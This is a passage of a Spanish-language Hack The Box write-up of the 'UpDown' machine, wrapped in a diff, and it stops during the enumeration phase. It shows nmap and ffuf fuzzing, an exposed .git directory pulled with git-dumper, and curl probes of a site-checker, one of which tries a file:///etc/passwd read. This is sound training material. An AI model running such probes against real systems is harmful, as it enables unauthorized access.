@@ -1,0 +1,480 @@
+<!doctype html><html lang="es"><head><title>UpDown | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las disable_functions en PHP. En la máquina, hay un binario SUID compilado de un script en Python, que puede ser abusado con un ataque de library hijacking. Finalmente, el usuario puede ejecutar easy_install con sudo, lo que conduce a la escalada de privilegios"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las disable_functions en PHP. En la máquina, hay un binario SUID compilado de un script en Python, que puede ser abusado con un ataque de library hijacking. Finalmente, el usuario puede ejecutar easy_install con sudo, lo que conduce a la escalada de privilegios"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las disable_functions en PHP. En la máquina, hay un binario SUID compilado de un script en Python, que puede ser abusado con un ataque de library hijacking. Finalmente, el usuario puede ejecutar easy_install con sudo, lo que conduce a la escalada de privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las disable_functions en PHP. En la máquina, hay un binario SUID compilado de un script en Python, que puede ser abusado con un ataque de library hijacking. Finalmente, el usuario puede ejecutar easy_install con sudo, lo que conduce a la escalada de privilegios"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web que tiene un directorio de desarrollo y expone un repositorio de Git. Usando esto, podemos encontrar alguna funcionalidad que esté oculta excepto para los desarrolladores y que se pueda abusar para obtener RCE después de planificar el ataque y saltarnos las disable_functions en PHP. En la máquina, hay un binario SUID compilado de un script en Python, que puede ser abusado con un ataque de library hijacking. Finalmente, el usuario puede ejecutar easy_install con sudo, lo que conduce a la escalada de privilegios"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/UpDown/UpDown.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/UpDown/UpDown.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/UpDown/UpDown.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="UpDown"><meta property="twitter:title" content="UpDown"><meta property="og:title" content="UpDown"><meta property="og:url" content="https://7rocky.github.io/htb/updown/"><meta itemprop="keywords" content="git,php,sudo,python,suid,library-hijacking,file-upload,file-permissions,static-code-analysis,lfi,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/updown/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/updown/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/updown/&text=UpDown" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/updown/&title=UpDown" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">UpDown</h1><time class="mt4 f6 dib tracked" datetime="2023-01-21T00:00:00+01:00">21 / 01 / 2023</time><br><p class="mb4 f6 dib tracked">13 minutos de lectura</p></header><div class="htb-image"><img alt="UpDown" src="/images/HTB/UpDown/UpDown.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/suid" title="Binario SUID">Binario SUID</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/library-hijacking" title="Library Hijacking">Library Hijacking</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfi" title="Inclusión de Archivos Locales">Inclusión de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraciónn">Enumeraciónn</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li></ul></li><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.177</li><li><strong>Fecha</strong>: 03 / 09 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.177 -p 22,80
+Nmap scan report for 10.10.11.177
+Host is up (0.041s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
+|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
+|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Is my Website up ?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 8.52 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeraciónn">Enumeraciónn</h2><p>Si vamos a <code>http://10.10.11.177</code>, veremos la siguiente página:</p><p><img src="/images/HTB/UpDown/UpDown-1.png" alt="UpDown 1"></p><p>De hecho, vemos un nombre de dominio (<code>siteisup.htb</code>). Podemos agregarlo a <code>/etc/hosts</code>, pero el sitio web para <code>http://siteisup.htb</code> es el mismo.</p><p>En primer lugar, podemos enumerar más subdominios usando <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.177 -H <span class="code-dark-yellow">'Host: FUZZ.siteisup.htb'</span> -fs 1131  
+<span class="code-dark-yellow">dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 91ms]</span>
+</code></pre></div><p>Y también rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://siteisup.htb/FUZZ  
+<span class="code-dark-blue">dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 84ms]</span>
+<span class="code-dark-green">                        [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 57ms]</span>
+<span class="code-dark-yellow">server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 45ms]</span>
+</code></pre></div><p>No tenemos acceso a <code>dev.siteisup.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -i http://dev.siteisup.htb/
+HTTP/1.1 403 Forbidden
+<span class="code-white">Date</span>:
+<span class="code-white">Server</span>: Apache/2.4.41 (Ubuntu)
+<span class="code-white">Content-Length</span>: 281
+<span class="code-white">Content-Type</span>: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at dev.siteisup.htb Port 80&lt;/address&gt;  
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div><p>Y en <code>/dev</code> no parece haber nada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -i siteisup.htb/dev/
+HTTP/1.1 200 OK
+<span class="code-white">Date</span>: Mon, 17 Oct 2022 21:20:00 GMT
+<span class="code-white">Server</span>: Apache/2.4.41 (Ubuntu)
+<span class="code-white">Content-Length</span>: 0
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8  
+
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -i siteisup.htb/dev/ -d <span class="code-dark-yellow">''</span>
+HTTP/1.1 200 OK
+<span class="code-white">Date</span>: Mon, 17 Oct 2022 21:20:04 GMT
+<span class="code-white">Server</span>: Apache/2.4.41 (Ubuntu)
+<span class="code-white">Content-Length</span>: 0
+<span class="code-white">Content-Type</span>: text/html; charset=UTF-8
+</code></pre></div><p>Entonces, probemos la funcionalidad del sitio web. Podemos probar <code>http://siteisup.htb</code>, y se ve bien:</p><p><img src="/images/HTB/UpDown/UpDown-2.png" alt="UpDown 2"></p><p>La opción <code>debug</code> muestra la respuesta HTTP completa:</p><p><img src="/images/HTB/UpDown/UpDown-3.png" alt="UpDown 3"></p><p>Si intentamos <code>http://127.0.0.1</code> con la opción de <code>debug</code>, también muestra el código HTML del sitio web actual:</p><p><img src="/images/HTB/UpDown/UpDown-4.png" alt="UpDown 4"></p><p>Ahora, podemos cambiar a <code>curl</code> y probar otros <em>endpoints</em> y <em>payloads</em>. Por ejemplo, <code>http://127.0.0.1/dev/</code>, pero la respuesta sigue siendo vacía:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> siteisup.htb -sd <span class="code-dark-yellow">'site=http://127.0.0.1/dev/&amp;debug=1'</span> | <span class="code-dark-green">sed</span> -n <span class="code-dark-yellow">'30,$p'</span>
+&lt;center&gt;http://127.0.0.1/dev/&lt;br&gt;&lt;font color='green'&gt;is up.&lt;/font&gt;&lt;/center&gt;&lt;center&gt;Debug mode:&lt;br&gt;&lt;textarea&gt;HTTP/1.1 200 OK  
+Date: Mon, 17 Oct 2022 20:45:35 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+&lt;/textarea&gt;&lt;/center&gt;      &lt;/section&gt;
+    &lt;/div&gt;
+
+    &lt;div id="footer_wrap" class="outer"&gt;
+      &lt;footer class="inner"&gt;
+        &lt;p class="copyright"&gt;siteisup.htb&lt;/p&gt;&lt;br&gt;
+      &lt;/footer&gt;
+    &lt;/div&gt;
+
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Podemos intentar leer el archivo <code>/etc/passwd</code>, pero el servidor nos caza:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> siteisup.htb -sd <span class="code-dark-yellow">'site=file:///etc/passwd&amp;debug=1'</span> | <span class="code-dark-green">sed</span> -n <span class="code-dark-yellow">'30,$p'</span>
+&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;      &lt;/section&gt;  
+    &lt;/div&gt;
+
+    &lt;div id="footer_wrap" class="outer"&gt;
+      &lt;footer class="inner"&gt;
+        &lt;p class="copyright"&gt;siteisup.htb&lt;/p&gt;&lt;br&gt;
+      &lt;/footer&gt;
+    &lt;/div&gt;
+
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>El subdominio <code>dev.siteisup.htb</code> parece estar caído:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> siteisup.htb -sd <span class="code-dark-yellow">'site=http://dev.siteisup.htb&amp;debug=1'</span> | <span class="code-dark-green">sed</span> -n <span class="code-dark-yellow">'30,$p'</span>
+&lt;center&gt;http://dev.siteisup.htb&lt;br&gt;&lt;font color='red'&gt;seems to be down.&lt;/font&gt;&lt;/center&gt;&lt;center&gt;Debug mode:&lt;br&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;/center&gt;      &lt;/section&gt;  
+    &lt;/div&gt;
+
+    &lt;div id="footer_wrap" class="outer"&gt;
+      &lt;footer class="inner"&gt;
+        &lt;p class="copyright"&gt;siteisup.htb&lt;/p&gt;&lt;br&gt;
+      &lt;/footer&gt;
+    &lt;/div&gt;
+
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>No hay nada más para probar aquí, así que enumeremos un poco más.</p><h3 id="enumeración-de-git">Enumeración de Git</h3><p>Podemos suponer que <code>/dev/</code> es un directorio real y debe contener algunos archivos. Usando <code>ffuf</code> podemos encontrar un directorio <code>.git</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://siteisup.htb/dev/FUZZ
+<span class="code-dark-green">                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 116ms]</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://siteisup.htb/dev/.FUZZ  
+<span class="code-dark-yellow">html                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 42ms]</span>
+<span class="code-dark-yellow">php                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 42ms]</span>
+<span class="code-dark-yellow">http                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 41ms]</span>
+<span class="code-dark-yellow">htdocs                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 50ms]</span>
+<span class="code-dark-yellow">htm                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 76ms]</span>
+<span class="code-dark-yellow">ht                      [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 67ms]</span>
+<span class="code-dark-blue">git                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 61ms]</span>
+<span class="code-dark-yellow">httpd                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 46ms]</span>
+...
+</code></pre></div><p>Entonces, es hora de usar <a href="https://pypi.org/project/git-dumper/"><code>git-dumper</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git-dumper</span>  http://siteisup.htb/dev/.git/ <span class="mtku">.</span>
+[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
+[-] Testing http://siteisup.htb/dev/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://siteisup.htb/dev/.git/ [200]
+[-] Fetching http://siteisup.htb/dev/.gitignore [404]
+[-] http://siteisup.htb/dev/.gitignore responded with status code 404
+[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/description [200]
+[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/config [200]
+[-] Fetching http://siteisup.htb/dev/.git/index [200]
+[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
+[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
